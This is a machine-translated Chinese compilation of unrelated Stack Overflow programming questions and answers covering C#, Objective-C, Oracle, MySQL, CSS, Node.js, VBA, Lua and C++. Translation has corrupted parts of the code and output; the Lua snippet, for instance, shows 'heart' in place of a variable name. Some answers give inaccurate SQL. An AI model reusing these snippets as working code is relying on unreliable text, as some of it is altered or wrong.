Microsoft 使用属性而不是字段的事实`Point.X`在历史上引起了混淆，因为`MyList[3].X = 4;`它将被转换为`MyList[3].Set_X(4)`，并且如果不查看定义的内部，`Set_X`则不可能在不更改有问题的结构；今天的 C# 编译器会猜测它不会工作，并且会禁止该构造，即使有些`struct`类型的属性设置器实际上可以正常工作。如果`X`是一个字段而不是一个属性，并且如果微软说过改变结构的两种安全方法是直接访问字段或将结构作为`ref`变异方法的参数（如果它是结构类型的静态方法，可以访问公共字段），则无需进行此类猜测。

鉴于使用暴露的结构字段而不是读写属性可以提高性能和语义清晰度，有什么理由将结构字段设为私有并将它们包装在属性中？数据绑定需要属性，但我认为它无论如何都不适用于结构类型（如果复制一个结构，然后将原始的某些属性设置为一个值，并将副本的相应属性设置为另一个值，那么应该使用什么值被报告给绑定对象？）结构属性有一些我不知道的好处吗？

就个人而言，我认为在许多情况下，“理想”结构只是一个公开的公共字段列表，以及一个其参数只是这些字段的初始值的构造函数，按顺序排列。这样的结构将提供最佳性能和可预测的语义（除了字段的类型和名称外，其行为与所有其他此类结构相同）。如果除了简单地读取和写入基础字段之外，它们无能为力的情况下，是否有任何理由支持读写属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:09:38.240

看不到使用`read/write`属性的不可变结构的任何好处，除了您写的一点：*将逻辑包装在属性的 setter 和/或 getter 中*，并*在您的代码库中维护一般准则*（有利于维护和可读性的观点） .

我个人在定义一个`struct` *几乎总是*使用原始`public`字段并且没有属性时，为了简单和易于使用我的类型（对于您已经编写的不可变类型的问题）

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-09T10:03:52.657

Rico Mariani[就这个主题写了一篇很好的 MSDN 博客文章](http://blogs.msdn.com/b/ricom/archive/2006/09/07/745085.aspx)。

使用公共字段而不是 getter 和 setter 的原因包括：

1.  不允许该字段具有任何值。
2.  预计客户将对其进行编辑。
3.  能够写出object.XY = Z之类的东西。
4.  做出强有力的承诺，即价值只是一个价值，并且没有与之相关的副作用（将来也不会）。

有些人觉得这很有争议。我怀疑这是因为在他们编写的软件中很少或从未出现过这种情况，但他们没有意识到在其他应用领域中也经常出现这种情况。

^([（这是我在此处提供的答案](https://stackoverflow.com/a/31052737/127670)的副本，但我认为该信息非常有用，可以在此处重复。）)

# objective-c - IOS vsnprintf实现使用NSString

> ID：12009193
> 
> 赞同：0
> 
> 时间：2012-08-17T16:01:05.187
> 
> 标签：objective-c, ios, nsstring, printf

我想使用 NSString 编写 vsnprintf 函数。

这是我的 vsnprintf 实现：

```
int my_vsnprintf(char *buffer, size_t count, const char *format, ...)
{
    int iRet;
    va_list ap;
    NSString *pnssBuffer=NULL;
    NSString *pnssFormat;
    const char *pcszBuffer;
    /* Format with NSString */
    pnssFormat=[NSString stringWithCString:format 
    encoding:NSUTF8StringEncoding];
    va_start(ap, format);
    pnssBuffer=[[NSString alloc] initWithFormat:pnssFormat arguments:ap];
    /* Copy to char * */
    pcszBuffer=[pnssBuffer cStringUsingEncoding:NSUTF8StringEncoding];
    memcpy(buffer, pcszBuffer, count);
    iRet=strlen(buffer);
    /* Free */
    [pnssBuffer release];
    va_end(ap);
    return iRet;
} 
```

当我用**char ***参数调用它时，它可以工作：

```
 my_vsnprintf(buffer, 256, "hello %s", "world");
NSLog(@"buffer = %s", buffer); 
```

正确打印：**buffer = hello world**

但是当我用**wchar_t ***参数调用它时，我只得到**世界的第一个字符**

```
 my_vsnprintf(buffer, 256, "hello %ls", L"world");
NSLog(@"buffer = %s", buffer); 
```

打印这个：**缓冲区=你好w**

我不明白为什么，对我的功能有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T19:38:14.793

根据《String Programming Guide》中的[String Format Specifiers](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Strings/Articles/formatSpecifiers.html)`initWithFormat:arguments:` ，朋友们不支持“%ls”格式。实际上，这里忽略了“l”修饰符。

有一种“%S”格式，但它是针对 16 位 Unicode 字符序列的，因此您不能将其用于`wchar_t`任何一种。

**添加**

`wchar_t`在 iPhone 和 Simulator 上是 4 字节的 Unicode（小端），因此您可以将其转换`NSString`为如下：

```
wchar_t *w = L"Hello world";
NSString *str = [[NSString alloc] initWithBytes:w length:4*wcslen(w)
    encoding:NSUTF32LittleEndianStringEncoding]; 
```

# oracle11g - 无法在 oracle 中将长数据类型转换为 xml

> ID：12009197
> 
> 赞同：1
> 
> 时间：2012-08-17T16:01:27.583
> 
> 标签：oracle11g, xmltype

我有一个存储 xml 的长数据类型的 oracle 列。现在我想在这个专栏上执行`EXTRACT`和`EXTRACTVALUE`功能。为此，我需要将 long 转换为 xmltype。但是当我这样做时：`xmltype.createxml(long_col_name),`我得到：`illegal use of long datatype`
我知道 long 已被弃用，但它是遗留数据库。所以...

编辑：根据建议，我尝试了：

```
SELECT 
EXTRACTVALUE( XMLTYPE (to_lob(long_col_name)), xpath_str) as value_date
FROM table_1; 
```

我得到：

```
[Error] Execution (2: 24): ORA-00932: inconsistent datatypes: expected - got LONG 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-09-08T11:05:05.147

检查这个链接 [很好的例子](http://www.oracle-developer.net/display.php?id=430)

简而言之，您需要执行以下操作：

```
with xml as 
    (select dbms_xmlgen.getxmltype('select long_col_name from table_1') as xml from dual)

    select extractValue(xs.object_value,'/ROW/long_col_name') as value_date
    from xml x, table(xmlsequence(extract(x.xml,'/ROWSET/ROW'))) xs
    where extractValue(xs.object_value,'/ROW/long_col_name') like '%xxxx%'; 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:21:59.223

您最好将 LONG 列类型迁移到 CLOB。将来也会让你受益。然后您可以在 CLOB 列上使用 xmltype。

# android - Android - 从当前语言环境猜测脚本布局方向

> ID：12009200
> 
> 赞同：0
> 
> 时间：2012-08-17T16:01:33.917
> 
> 标签：android, layout, text

如果它使用从左到右或从右到左的文本布局，有没有办法从当前的 Android 语言环境中获取？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T07:30:32.890

找到的解决方案：在您的项目中包含 google BidiUtils。它有很多有用的双向功能，其中之一是：

hasAnyRtl

# javascript - 关于如何安全地记录用户回答测验挑战需要多长时间的想法？

> ID：12009203
> 
> 赞同：0
> 
> 时间：2012-08-17T16:01:44.653
> 
> 标签：javascript

我有一个测验网络应用程序，测验的玩家有 20 秒的时间来回答每个问题，并且会因为回答得更快而获得时间奖励。

有哪些方法可以记录用户回答难以/不可能操作的问题所花费的时间？

可能会有奖励给得分最高的玩家，因此会有操纵帖子数据的动机。

到目前为止，这是我唯一的想法，但对我来说似乎很容易操纵：

1.  问题将通过 AJAX 加载。
2.  存储玩家通过 JavaScript 接收问题的时间（以毫秒为单位）。
3.  为每个问题分配一个哈希值，为每个单独的答案分配一个哈希值。
4.  当玩家选择一个答案时，创建一个新的哈希值，其中包含问题的哈希值 + 答案的哈希值 + 总时间差的哈希值（以毫秒为单位）。
5.  将该哈希发布到我的服务器。
6.  服务器端我将拥有所有可能的有效哈希的缓存索引，用于该问题的正确答案+时间组合。（每个问题总共 20,000 个哈希值。每毫秒一个，最多 20 秒）
7.  如果提交的哈希与索引中的一个匹配，则玩家将获得正确答案和他们的时间奖励。

我还考虑过使用加密的 Flash 文件来处理要提交的哈希，但除非我弄错了，否则很容易在这些文件上使用反编译器来查看发生了什么。所以它并没有提供更多的安全性。

有人有其他想法吗？

编辑 - 我一直在考虑这个问题，以至于我完全忘记了用户能够改变他们的时钟，这使得任何安全地做这个客户端的机会都无效。

因此，服务器端时间戳确实是唯一可靠的方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T16:05:30.030

简单的回答：不要相信客户所说的任何事情，如果可能的话，不要对客户做任何事情。

为此使用服务器端录制。例如

1.  当“给我问题文本”请求进入时设置会话变量记录时间
2.  设置会话可变录制时间，当答案进来时

繁荣。用户可以影响这一点的唯一方法是询问问题文本并发送答案。更改他们的系统时钟，捏造浏览器中的数据，捏造 HTTP 请求中的数据，因为它击中线路 - 所有这些都是无用的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:05:17.197

如果您使用的是 PHP，您可以`$_SESSION['receivedQuestion'] = time();`在用户收到问题时设置 a，在用户回答问题时检查`time()-$_SESSION['receivedQuestion'] <= 20`. 请注意，当用户的互联网连接速度较慢时，这可能会带来一些麻烦，但这应该不是太大的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:05:32.647

为什么在提出问题时不使用服务器端时间戳，而在正确回答时使用另一个时间戳？

我了解请求延迟可能会导致问题，但将其留给客户并不是很安全。

# mysql - 如何在当前行中选择上一行的值和过去？

> ID：12009208
> 
> 赞同：0
> 
> 时间：2012-08-17T16:02:00.507
> 
> 标签：mysql

我正在使用 mysql，这是我当前表中的条目。

所以这里本月的***上一个余额***应该是上个月的***余额***。如何从数据库的前一行获取此值。

```
Previous_balance Remaining_Balance
        0.00        42.64
        0.00        627.69
        0.00        45.54
        0.00        67.60 
```

结果应该是

```
Previous_balance Remaining_Balance
        0.00        42.64
        42.64       627.69
        627.69      45.54
        45.54       67.60 
```

我的 ID 为 PK，我想将新的 previous_balance 存储在数据库中并在表格上打印。所以我可以计算每月费用和使用量以及其他东西。感谢您的回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:16:47.357

就像是

`SELECT LAST(remaingBalance) as previousBalance, FIRST(remaingBalance) as remaingBalance FROM ...
WHERE ...
GROUP BY month`

见[http://www.w3schools.com/sql/sql_functions.asp](http://www.w3schools.com/sql/sql_functions.asp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:20:18.677

假设该`id`字段是有序的，试试这个：

```
UPDATE Balances 
  SET b1.Previous_balance = COALESCE((SELECT b2.Remaining_Balance 
                                      FROM Balances b2 
                                      WHERE b2.id < b1.id 
                                      ORDER BY b2.id DESC 
                                      LIMIT 1),0) 
FROM Balances b1 
```

我没有安装 mySQL，所以我不能保证所有的语法。我知道 SELECT 语句虽然有效。

# html - 以 100% 的高度并排创建两个浮动 div

> ID：12009209
> 
> 赞同：0
> 
> 时间：2012-08-17T16:02:02.733
> 
> 标签：html, css

我正在尝试创建一个高度为 100% 的并排 div，我设法让第一个 div 正常工作，但第二个 div 导致问题，过去 3 个小时一直在尝试这样做。

```
#mainWrapper{
    width: 900px;
    margin:0px auto;
    background:#fff;
}

/*leftColumn */
.leftColumn {
    float:left;
    width:250px;
    height:100%;
    background:#fafafa;
    border-left:solid 1px #dedede;
    position:fixed;
    top:0px;
}

/* Content */
.mainContent {
    float: left;
    width: 650px;
    height:100%;
    background:#fff;
    margin-left:252px;
    padding-bottom: 50px;
} 
```

它应该如何看起来像 [http://i49.tinypic.com/ycef7.jpg的示例](http://i49.tinypic.com/ycef7.jpg)

目前看起来如何。（尝试了一切不知道如何修复它） [http://i49.tinypic.com/2ryk5eo.png](http://i49.tinypic.com/2ryk5eo.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T19:37:24.933

与其给两个向左浮动的内部 div 提供显式高度，不如`overflow:hidden;`在父 div 上使用，例如：

```
#mainWrapper{
    width: 900px;
    margin:0px auto;
    background:#fff;
    overflow:hidden;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:05:57.873

添加

```
html, body {
    height: 100%;
} 
```

( [http://jsfiddle.net/zYWjJ/2/](http://jsfiddle.net/zYWjJ/2/) )

# node.js - Node - 如何使用节点中的回调处理未捕获的异常？

> ID：12009213
> 
> 赞同：1
> 
> 时间：2012-08-17T16:02:31.013
> 
> 标签：node.js, process

我正在编写一个节点 js 应用程序。我正在使用 request 和cheerio 来加载一组 URL 并获取该站点的大量信息，现在假设我想要获取的只是标题：

```
var urls = {"url_1", "url_2", "url_3",...,"url_n"};   
for(var i=0; i<urls.length; i++)
{
     getDOMTitle(urls[i],function(error,title){
         if(error)
            console.log("Error while getting title for " + urls[i]);
         else
            console.log("The title for " + urls[i] + " is " + title);
     });
} 
```

这就是我的 getDOMTitle 方法的外观：

```
function getDOMTitle(urlReq,callback)
{
      var request = require('request');
      var cheerio = require('cheerio');
      request({url:urlReq},function(error, response, doc){
           var $ = cheerio.load(doc);
           if(error)
           {
              callback(true,null);
           }
           else
           {
              $('title', 'head').each(function (i, elem) {
                 var title = $(this).text();
                 callback(false,title);
               });     
           }
      }
} 
```

如果模块抛出未捕获的异常，我该如何处理这种情况？我尝试添加以下内容：

```
 process.on('uncaughtException', function (err) {
    console.error(err);
    console.log("Node NOT Exiting...");
    callback(true,null);
  }); 
```

当我这样做时，我收到一条错误消息，指出一旦发送了标头，我就无法设置它们。如果我从进程错误处理中删除回调，我看不到该错误，但客户端旋转了很长时间，因为我假设我们从未调用回调。

我该如何解决这个问题？

另外，我在某处读到您可以在应用程序级别捕获未捕获的异常，因此您不必复制代码以在每个方法中捕获它，这可能吗？如果是，并且引发异常的方法预计会回调一些信息，那如何实现？

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T19:32:09.263

为了回答您提出的问题，使用未捕获的异常处理程序作为一般的错误捕获机制通常被认为是糟糕的设计。用它来处理除不可恢复的情况之外的任何事情是一种虚假的经济，您只需要在退出之前进行一些清理。

您的示例代码中存在一些问题。在您的`for`循环中，所有回调都将报告它们正在使用数组中的最后一个 URL，因为它们都引用 的同一个副本`i`，当它们中的任何一个执行时，该副本将处于其最高值。您需要使用辅助函数或立即函数调用为每个回调提供`i`.

在`getDOMTitle`错误回调中应该是`callback(error)`并且循环中的代码应该在错误消息中包含返回的值。成功回调应该`null`用作它的第一个参数，尽管这只是一个约定问题。

# flash - 如何在使用 stop() 后强制我的 flash 电影重新启动；在儿童电影剪辑中？

> ID：12009214
> 
> 赞同：0
> 
> 时间：2012-08-17T16:02:34.820
> 
> 标签：flash, loops, actionscript, movieclip

我有一个 Flash 文件（一个简单的横幅），其中包含子 mc 中的所有动画。到目前为止，我使用的唯一 actionscript (2.0) 是 stop(); 在一些儿童 mc 的结尾，这样他们就会留在舞台上。这似乎阻止了整个事情的循环。当我让它循环播放时，没有一个子 mc 处于其时间线的开头。

有没有办法可以在最后一个时间线的末尾“重置”它们，以便它能够正确循环？还是有更好的方法可以控制止损？

我是一个完整的 AS2 菜鸟，但是到处寻找答案，但没有找到任何有用的东西:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:55:45.043

您可以通过调用 child_mc.gotoAndPlay(1); 来“重置”movieClip 时间线；

如果您希望递归停止/循环对象的所有子剪辑（或绝对所有内容），请查看**我**对这个问题的回答： [如何在 Flash CS5 中制作通用暂停按钮？](https://stackoverflow.com/questions/11022556/how-to-make-a-universal-pause-button-in-flash-cs5/11055990#11055990)

使用该功能，您可以通过执行以下操作一次重置所有剪辑： `recursiveStop(stage,false,1);`

# vb.net - System.ServiceProcess.ServiceController 未定义 vb.net

> ID：12009224
> 
> 赞同：2
> 
> 时间：2012-08-17T16:03:01.387
> 
> 标签：vb.net, visual-studio-2008, service

在 Visual Studio 中，我添加了 System.ServiceProcess.ServiceController 但收到一条错误消息，说它没有定义。

网上到处都说它应该工作。

但为什么不呢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T16:03:01.387

解决方法是转到项目属性引用选项卡并添加 System.ServiceProcess

然后它不再错误。

# php - 使用 PHP 从 MySQL 数据库中选择可能相关的项目（例如：for 'orange', give 'bread'）

> ID：12009226
> 
> 赞同：3
> 
> 时间：2012-08-17T16:03:02.567
> 
> 标签：php, mysql, string, select, similarity

我有一个系统，我必须在其中选择“相似”记录。想象一个包含大量产品列表的数据库，当用户输入产品的部分名称时，会出现一个产品列表作为关于他正在搜索的产品的*建议。*这些产品也有更长的*描述*字段。

我认为这与**查询**`WHERE product_name LIKE '%entered_string%'`无关。逻辑类似于 Stack Overflow 可能使用的逻辑，id est：当您提出问题时，它会提示您*可能已经有答案的问题*和*类似的问题*，这两者显然都使用一种方法从我的问题标题/内容并在数据库中搜索，显示结果。

我只是想知道它是否可以使用 PHP 并使用 MySQL 作为数据库来完成。

示例：输入`food`应该会给我们类似`1kg oranges`,`bread`和的结果`cookies`。这两者都有类似的东西，可以帮助以编程方式将它们相互链接。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:11:25.353

*有很多方法可以处理这种情况*。但我认为**直接**一个是为每个项目映射**多个关键字/标签。**因此，当用户输入时，您**不会****搜索项目表**，您应该搜索映射的 关键字**并**基于该搜索加载相关项目。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T16:09:09.963

如果您希望显示类似的产品，则需要将该信息放入您的数据库中。因此，为食品创建一个类别，并将每种食品分配到该类别。这样您就可以轻松选择类似的产品。没有其他有效的方法可以做到这一点

所以你的数据库：

```
categories:
|id|name
 1    fruit
 2    Cars

Products
|id|name|category_id
  1  apple 1
  2  Ford focus  2 
```

你可以像这样选择：

```
SELECT `name`,`id` FROM `products` WHERE category_id = 1; 
```

另一种方式（如评论中所建议）是标签

```
Products
|id|name|tags
  1  apple "fruit food delicious" 
  2  Ford focus  "Car wheels bumper" 
```

最好的方法是对标签使用全文搜索：

```
SELECT * FROM `products` WHERE MATCH(tags) AGAINST ('fruit') 
```

确保在标签上有全文索引。

# java - 如何在 reduce 阶段工作时启动 map 阶段

> ID：12009227
> 
> 赞同：2
> 
> 时间：2012-08-17T16:03:11.283
> 
> 标签：java, hadoop, reduce, mapper

我有这种情况。工作 A 和工作 B。是否有机会使用 JobA reduce 阶段提供的数据来启动 JobB 映射阶段，而这仍在工作？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T21:55:18.477

我唯一想到的是有一个线程（在您的驱动程序类中启动）永久检查 JobA 的输出目录。当创建并完全编写了特定（组）part-r-xxxx 文件时，您可以启动 JobB，并将该特定（组）part-r-xxxx 文件作为输入。

我现在唯一能确定的问题是与检查 part-r-xxxx 文件是否已完全写入有关的问题。

# xml - 在视图中隐藏列的值

> ID：12009240
> 
> 赞同：0
> 
> 时间：2012-08-17T16:04:12.553
> 
> 标签：xml, sharepoint-2010, schema

我试图在需要之前隐藏列中的日期值，有没有办法在视图中隐藏字段的值？

```
<Field ID="{6BA16C6C-79E0-4F4D-B2A7-81FF2FC2B801}" Name="len_cp_SignedIn_FullTime"
StaticName="len_cp_SignedIn_FullTime"
DisplayName="Signed In Time">
<Default>[Today]</Default>
</Field> 
```

这是该字段的值，在我看来，它为此列显示 [Today]，但在站点上触发其他内容之前，我不需要查看该值，有没有办法在此之前隐藏它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:08:25.497

尝试将其存储在字段的属性中

`<Field ID="{6BA16C6C-79E0-4F4D-B2A7-81FF2FC2B801}" Name="len_cp_SignedIn_FullTime" StaticName="len_cp_SignedIn_FullTime" DisplayName="Signed In Time" Default="[Today]"> </Field>`

然后在需要时使用属性客户端

# mysql - 获取最后一个不同的元素MongoDB，mysql

> ID：12009243
> 
> 赞同：0
> 
> 时间：2012-08-17T16:04:30.603
> 
> 标签：mysql, mongodb

我有以下架构的集合：

```
{
  "_id" : ObjectId("502e66f201f04e16a8885e8c"),
  "sensorID" : 2,    // id of the sensor
  "loc" : [3, 2],    // location of the sensor x,y
  "time" : new Date("Fri, 17 Aug 2012 19:44:50 GMT +04:00")   // time of the last meausurement
} 
```

所以网络中的传感器很少。他们正在移动，每隔 x 秒他们就会告诉服务器他们的下落。

我想找到每个传感器的最后通知位置。

我想做的是：

```
db.runCommand({distinct: 'points', key: 'sensorID'}) 
```

选择所有不同的传感器，但我不知道最后一次应该在哪里放置额外的约束。

还有最重要的问题。我真的应该在mongo中这样做吗？可能是使用 MySql 更好

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T17:02:12.653

传感器是否几乎同时报告并且部分陈旧数据是否可以容忍？

基本上有很多方法可以解决这个问题。

一种是，做一些类似于 db.collection.find({}).sort( {time: -1}).limit( #Number of sensors#) 的事情，这实际上是一个 MAX 函数，它会给你传感器的最新位置。然而，这种方法只有在所有传感器同时广播时才有效，当然如果其他传感器之一的报告速度特别慢，那么一个传感器当然容易出现部分陈旧数据或重复数据，例如一个传感器的竞争条件自慢速传感器上次更新以来已更新两次，导致它在列表中出现两次，不包括慢速传感器。. 可以通过附加上面的 distinct 子句来解决这个问题，但是这仍然可能导致潜在的过时数据，但最多只能关闭一次。如果每隔一段时间落后一个周期并不是什么大不了的事，那么这是合理的。

另一种方法是一次查询每个传感器，例如

db.collection.find({ "sensorID : #sensorID#"}).sort( { time: -1}).limit(1);

另一种方法是将您的架构更改为具有“最新”标志。并且在插入新的传感器点和时间时，只需查询该传感器的旧“最新”文档并将其更新为 false。这涉及到一点错误处理，因为您永远不会想要没有“最新”并且您正在查询的情况。因此，更好的方法是首先将您要插入的新文档的标志设置为真。然后将旧文档标志更新为 false。然后，如果您在更新之间一次搜索一个，则可以对两者进行排序并添加 1 的限制以获取最新的。否则，如果您想一次搜索所有传感器并返回所有传感器的列表，并且它发生在更新之间，

或者，您可以通过添加 mapreduce 函数和对传感器进行分组并按时过滤来干净地做到这一点。

希望这可以帮助。

# vba - 使用 VBA 根据 B 列的值重置 A 列中的值

> ID：12009244
> 
> 赞同：0
> 
> 时间：2012-08-17T16:04:34.800
> 
> 标签：vba, excel, excel-2003

我有一张看起来像这样的工作表，但更复杂：

```
Product            count     real count
Rake Complete      -1        n/a
Rake Head          2         =B3+B2
Rake Handle        2         =B4+B2
Bike Complete      -5        n/a
Bike Handle        10        =B6+B5
Bike Wheel         25        =B7+B5+B5
Bike Frame         90        =B8+B5+B6 
```

随着公式的工作，它看起来像这样：

```
Product            count     real count
Rake Complete      -1        n/a
Rake Head          2         1
Rake Handle        2         1
Bike Complete      -5        n/a
Bike Handle        10        5
Bike Wheel         25        15
Bike Frame         90        85 
```

我会感谢 VBA 代码的帮助，它将 B 列的值重置为 C 列的值，如下所示：

```
Product            count    real count
Rake Complete      0        n/a
Rake Head          1        1
Rake Handle        1        1
Bike Complete      0        n/a
Bike Handle        5        5
Bike Wheel         15       15
Bike Frame         85       85 
```

我有其他 VBA 代码放在其他工作表上，这些工作表对`count`列中的值进行加减。为了使这个工作清单尽可能准确并且不基于变量，我想每天重置 B 列。这样，如果计数稍微偏离，我就不必重置所有内容。

我已经为此工作了一段时间，我知道有比我尝试过但失败的五个更好的方法来做到这一点。虽然它需要基于列，但我的工作表有 465 行需要应用，并且随着业务的增长，此工作表上的行也将如此。

让我最接近的代码是这样的：

```
Sub CommandButton1_Click()

    Columns("C:C").Select
    Selection.Copy
    Columns("B:B").Select
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False

    Dim r As Long
    For r = Cells(Rows.Count, 2).End(xlUp).Row To 1 Step -1
        If Cells(r, 2) = "n/a" Then Cells(r, 2).value = 0
    Next r

End Sub 
```

我遇到的主要问题是每次运行代码时，我的其他一些产品的数量都会增加。如果您查看自行车车架，您可以单独出售它，但您也可以在出售时获得自行车把手。当此代码重置时，它总是添加自行车把手。如果我运行它 10 次而不进行任何更改，我的库存会增长得更高，那么 excel 愿意显示。知道如何解决这个问题或任何不同方式的想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T18:15:46.557

从 C 列复制和粘贴值 - 使用特殊粘贴 - 从 C 列到 B 列。

但是随后 C 列的值显然会发生变化——因为爱斯坦和因果关系或类似的东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-20T01:06:05.900

看起来您应该使用 D 列并将其称为“显示计数”或类似的名称。在 D 列中使用此公式：

```
=IF(C18="n/a", 0, C18) 
```

然后，如果 B 和 C 列让您的老板感到困惑，您可以隐藏它们。

![显示计数列](../Images/c537f8705ef90590af1aa3c04e1defb6.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-20T07:21:23.863

在工作簿打开事件中尝试此宏。我希望它可以解决您的问题：

```
Dim realcount() As Variant
Dim x As Single

Private Sub Workbook_Open()
   On Error Resume Next:
    x = Sheet1.Cells(2, 3).End(xlDown).Rows
    ReDim realcount(x)
    For i = 2 To x
        realcount(i) = Sheet1.Cells(i, 3).Value
        Sheet1.Cells(i, 2).Value = realcount(i)
        If Sheet1.Cells(i, 3).Value = "n/a" Then
            Sheet1.Cells(i, 2).Value = 0
        End If
    Next
End Sub 
```

# crystal-reports - 如何在 Crystal Reports 中的条形图上指定数字格式？

> ID：12009246
> 
> 赞同：0
> 
> 时间：2012-08-17T16:04:36.190
> 
> 标签：crystal-reports

在图表专家中，数字格式显示为灰色，除非您明确设置图表的最小值和最大值。我不知道为什么这两个选项会耦合在一起，这根本没有意义。有什么方法可以将我的值表示为货币，而无需为数据范围选择任意最小/最大值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:35:09.693

你只是找错地方了。单击其中一个轴标签（要更改的数字轴），然后右键单击它并选择“设置轴标签格式”。如果您在“数字”选项卡下查看，您可以将“类别”更改为货币并根据需要设置格式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-20T12:57:48.137

如果您想要更多控制权，另一种方法是使用公式。

*   totext({tablename.fieldname}, 0) + "%"
*   "£" + totext({tablename.fieldname}, 0)

等等。这些将使您可以完全控制数据的外观。（请注意，您应该将其用于分组字段[即周数]，而不是用于数量字段[即销售额]）。

# iphone - 将 Lua 导入 Cocos2d 项目

> ID：12009252
> 
> 赞同：0
> 
> 时间：2012-08-17T16:05:18.933
> 
> 标签：iphone, objective-c, cocos2d-iphone, lua

我在尝试将 Lua 库导入 Xcode 4 cocos2d 项目时遇到了一些困难。

到目前为止，我已经完成了以下步骤以将 lua“安装/编译”到我的 mac。

1.  打开你的 Terminal.app
2.  wget [http://www.lua.org/work/lua-5.2.0-alpha.tar.gz](http://www.lua.org/work/lua-5.2.0-alpha.tar.gz)
3.  tar xvzf lua-5.2.0-alpha.tar.gz
4.  cd lua-5.2.0-alpha/src
5.  make macosx（我相信你已经安装了 Xcode）

现在在我的终端中，如果我运行 make test 它会运行并向我显示 helloworld 和我拥有的 lua 版本。

所以现在我尝试将库导入我的 xcode cocos2d 项目的目标。为此，我完全按照本网站（[http://www.grzmobile.com/blog/2009/11/13/integrating-lua-into-an-iphone-app.html](http://www.grzmobile.com/blog/2009/11/13/integrating-lua-into-an-iphone-app.html)）上的步骤进行操作，但在它说的步骤以下

点击“链接库”下方的“+”按钮</p>

选择顶部的“libLua.a”，然后单击“添加”按钮。

我单击添加，添加了 libLua.a，但是在列表中它是“红色的”，而且我也没有在我的 xcode 窗口左侧的项目文件列表/树中看到它。

有人可以告诉我我错过了什么或我做错了什么吗？

提前非常感谢。

ps不知道这是否有帮助......当我运行 sudo cp lua /usr/bin/lua 我没有得到这样的文件或目录

HellowWorldLayer.mm 下面的评论内容

```
#import "HelloWorldLayer.h"  
#include "lua.h" 
#include "lualib.h"

#include "lauxlib.h"

#import "mcLua.hpp"
#import "ShadowLabel.h"

int run_lua(void)

{

lua_State *l;

l = lua_open();

luaopen_base(heart);

printf("\nAbout to run Lua code\n");

luaL_loadstring(l, "print(\"Running Lua Code...\")");

lua_pcall(l, 0, LUA_MULTRET, 0);

printf("Lua code done.\n\n");

lua_close(heart);

return 0;

}

// HelloWorldLayer implementation
@implementation HelloWorldLayer

+(CCScene *) scene
{
 // 'scene' is an autorelease object.
 CCScene *scene = [CCScene node];

 // 'layer' is an autorelease object.
 HelloWorldLayer *layer = [HelloWorldLayer node];

 // add layer as a child to scene
 [scene addChild: layer];

 // return the scene
 return scene;
}

// on "init" you need to initialize your instance
-(id) init
{
 // always call "super" init
 // Apple recommends to re-assign "self" with the "super" return value
 if( (self=[super init])) {

  // create and initialize a Label
  CCLabelTTF *label = [CCLabelTTF labelWithString:@"Hello World" fontName:@"Marker Felt" fontSize:64];

  // ask director the the window size
  CGSize size = [[CCDirector sharedDirector] winSize];

  // position the label on the center of the screen
  label.position =  ccp( size.width /2 , size.height/2 );

  // add the label as a child to this Layer
  [self addChild: label];

        run_lua();
 }
 return self;
}

// on "dealloc" you need to release all your retained objects
- (void) dealloc
{
 // in case you have something to dealloc, do it in this method
 // in this particular example nothing needs to be released.
 // cocos2d will automatically release all the children (Label)

 // don't forget to call "super dealloc"
 [super dealloc];
}
@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T18:22:15.960

不用担心图书馆会变成红色或保持红色。不幸的是，Xcode 很少能做到这一点，所以你无法判断它是否因为错误而变红，或者它是否仍然有效。该库也不会出现在项目导航器中，也不是必须的。

因此，您的描述缺少您遇到的实际问题。你试过编译吗？你得到什么样的错误？

顺便说一句，如果你通过下载和安装[Kobold2D](http://www.kobold2d.com)来启动你的 cocos2d 项目，你会得到 Lua 已经集成并在每个项目中工作。然后，您可以完全跳过这些库设置问题并开始处理您的项目。

# c++ - CRTP：返回对派生类的引用？

> ID：12009257
> 
> 赞同：1
> 
> 时间：2012-08-17T16:05:38.140
> 
> 标签：c++, casting, operator-overloading, crtp

通过什么来替换缺失的行以使此 CRTP 解决方案正常工作？

```
template<class Crtp> class Base
{
    public:
        inline Crtp& operator=(const Base<Crtp>& rhs)
        {
            for (unsigned int i = 0; i < const_size; ++i) {
                _data[i] = rhs._data[i];
            }
            return /* SOMETHING HERE BUT WHAT ? */
        }

    protected:
        static const unsigned int const_size = 10;
        double _data[const_size];
};

class Derived : public Base<Derived>
{
}; 
```

其他问题：您将提供的解决方案在运行时是否有成本（与直接在派生类中实现运算符的解决方案相比）？

非常感谢你。

* * *

## 回答 #1

> 赞同：1
> 
